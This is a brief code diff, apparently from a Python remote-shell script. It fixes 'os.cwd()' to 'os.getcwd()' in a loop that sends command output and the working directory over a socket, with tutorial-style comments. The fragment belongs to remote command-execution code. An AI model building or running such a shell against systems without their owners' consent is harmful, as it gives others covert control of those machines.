@@ -27,7 +27,7 @@ while True:
          #we use the os.cwd to output the current working directory and show it on the terminal
          #Whenever we enter a command like 'dir' we see the output, and then the cursor goes to a new line
          #We also see the CWD there
-         s.send(str.encode(output_str + str(os.cwd()) + '> '))
+         s.send(str.encode(output_str + str(os.getcwd()) + '> '))
          print(output_str)
 
 #Close COnnection
